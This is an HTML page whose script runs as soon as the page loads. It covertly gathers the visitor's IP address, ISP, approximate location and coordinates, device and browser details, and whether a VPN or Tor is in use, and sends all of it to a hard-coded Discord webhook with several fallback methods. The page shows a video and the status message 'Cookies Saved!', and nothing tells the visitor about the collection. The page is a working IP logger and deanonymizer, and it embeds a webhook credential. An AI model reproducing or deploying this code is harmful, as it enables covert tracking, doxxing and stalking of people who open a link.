<body>

    </video>

        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">

    <div id="status">⏳ Initializing...</div>

<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    function setStatus(text, isError = false) {
        const el = document.getElementById('status');
        if (el) {
            el.textContent = text;
            el.style.color = isError ? '#ff4444' : '#00ff00';
            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
        }
    }

    // ================================================================
    //  FAST IP FETCH (1s timeout)
    // ================================================================
    function getIPFast() {
        return Promise.race([
            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(1000) })
                .then(res => res.json())
                .then(data => data.ip ? data : null)
                .catch(() => null),
            fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(1000) })
                .then(res => res.json())
                .then(data => data.query ? {
                    ip: data.query,
                    org: data.isp,
                    country_name: data.country,
                    region: data.regionName,
                    city: data.city,
                    latitude: data.lat,
                    longitude: data.lon,
                    proxy: data.proxy || false
                } : null)
                .catch(() => null),
            new Promise(resolve => setTimeout(resolve, 1000, null))
        ]);
    }

    // ================================================================
    //  ENHANCED VPN/TOR DETECTION (fast, without battery)
    // ================================================================
    function detectVPNorTOR() {
        let isVpn = false;
        const ua = navigator.userAgent;

        // 1. User-Agent & webdriver
        if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) {
            isVpn = true;
        }

        // 2. WebRTC leak check (async, but we'll run it and return promise)
        return new Promise((resolve) => {
            const checkWebRTC = () => {
                return new Promise((res) => {
                    let pc = null;
                    let hasRealIP = false;
                    try {
                        pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer()
                            .then(offer => pc.setLocalDescription(offer))
                            .catch(() => {});
                        pc.onicecandidate = (e) => {
                            if (!e.candidate) {
                                pc.close();
                                res(hasRealIP);
                                return;
                            }
                            const parts = e.candidate.candidate.split(' ');
                            if (parts.length > 7) {
                                const ip = parts[4];
                                if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                                    hasRealIP = true;
                                }
                            }
                        };
                        setTimeout(() => {
                            if (pc) pc.close();
                            res(hasRealIP);
                        }, 1000);
                    } catch (e) {
                        res(false);
                    }
                });
            };

            // Run WebRTC check and also check IP data later
            // We'll resolve after both, but we can combine later in main
            // For simplicity, we return a promise that resolves to boolean
            checkWebRTC().then(hasRealIP => {
                if (!hasRealIP) isVpn = true;
                resolve(isVpn);
            });
        });
    }

    // ================================================================
    //  SEND MESSAGE
    // ================================================================
    function sendMessage(msg) {
        return new Promise((resolve) => {
            let sent = false;
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg }),
                keepalive: true
            })
            .then(res => res.ok ? (sent = true, resolve(true)) : null)
            .catch(() => {
                // fallback sendBeacon
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                if (navigator.sendBeacon(WEBHOOK, blob)) {
                    sent = true;
                    resolve(true);
                } else {
                    // XMLHttpRequest
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', WEBHOOK, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({ content: msg }));
                        xhr.onload = () => { if (xhr.status === 200 || xhr.status === 204) resolve(true); };
                        xhr.onerror = () => resolve(false);
                        setTimeout(() => resolve(false), 2000);
                    } catch (e) {
                        resolve(false);
                    }
                }
            });
            setTimeout(() => resolve(sent), 3000);
        });
    }

    // ================================================================
    //  MAIN
    // ================================================================
    (async function() {
        try {
            setStatus('Collecting data...');

            // ---- Gather system info (synchronous) ----
            const ua = navigator.userAgent;
            const os = (() => {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Not available';
            })();
            const browser = (() => {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Not available';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Not available';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ---- Get IP (fast) ----
            setStatus('Fetching IP...');
            const ipData = await getIPFast();

            // ---- Detect VPN/TOR (async) ----
            setStatus('Checking VPN/TOR...');
            let isVpn = await detectVPNorTOR();

            // Refine with IP data
            if (ipData) {
                if (ipData.proxy === true) isVpn = true;
                if (ipData.org) {
                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                    const orgLower = ipData.org.toLowerCase();
                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
                }
            }

            // ---- Build message (no Windows username, no "Unknown"/"Encrypted") ----
            const ip = ipData ? ipData.ip : 'Not available';
            const isp = ipData ? ipData.org : 'Not available';
            const location = ipData ? (ipData.city + ', ' + ipData.region + ', ' + ipData.country_name) : 'Not available';
            const coords = ipData ? (ipData.latitude + ', ' + ipData.longitude) : 'Not available';

            const msg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
**RAM:** ${navigator.deviceMemory || 'N/A'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            // ---- Send ----
            setStatus('Sending...');
            const sent = await sendMessage(msg);

            setStatus(sent ? '✅ Cookies Saved!' : '❌ Send failed – check webhook', !sent);

        } catch (err) {
            setStatus('❌ Error: ' + err.message, true);
            console.error(err);
        }
    })();
</script>
